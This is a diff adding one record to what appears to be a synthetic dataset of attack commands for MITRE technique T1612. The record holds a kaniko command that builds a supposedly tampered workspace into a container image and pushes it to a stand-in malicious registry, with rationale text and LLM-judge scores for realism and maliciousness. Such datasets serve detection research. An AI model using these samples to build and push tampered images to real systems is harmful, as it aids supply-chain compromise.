@@ -1,0 +1,41 @@
+{
+  "technique_id": "T1612",
+  "platform": "linux",
+  "shell": "bash",
+  "command": "kaniko -c /workspace --snapshotMode redo --destination myevilrepo/compromised:initial",
+  "explanation": "Utilize kaniko in a workspace likely pre-configured with malicious alterations, with the redo snapshot mode to ensure an efficient but potentially dangerous build mechanism, pushing the image to an intended malicious repository.",
+  "rationale_steps": [
+    "Set build context to a manipulated workspace prepared with harmful intent.",
+    "Enhance hidden impact through the redo snapshot mode minimizing layers."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1612-aba9f22d-a1fcbc85",
+  "source_prompt_hash": "aba9f22d",
+  "timestamp_utc": "2025-07-10T23:23:42.176093Z",
+  "validation": {
+    "syntax_ok": {
+      "pass": true,
+      "forbidden_tokens": false,
+      "obfuscation_suspicious": false,
+      "obfuscation_entropy": 4.24,
+      "command_length": 85
+    },
+    "llm_judgments": [
+      {
+        "model": "gpt-4-turbo",
+        "score": 0.93,
+        "category_fit": 1.0,
+        "attack_realism": 0.9,
+        "maliciousness": 0.9,
+        "technical_plausibility": 1.0,
+        "privilege_relevance": 0.7,
+        "reason": "The sample reflects the technique's description about building custom container images with malicious alterations perfectly, is technically plausible using kaniko, realistically represents an actionable attack method, and though it does not require elevated privileges, such actions on a host might not be typical for non-privileged users.",
+        "timestamp": "2025-07-12T18:34:38.641778Z"
+      }
+    ],
+    "llm_average_score": 0.93,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
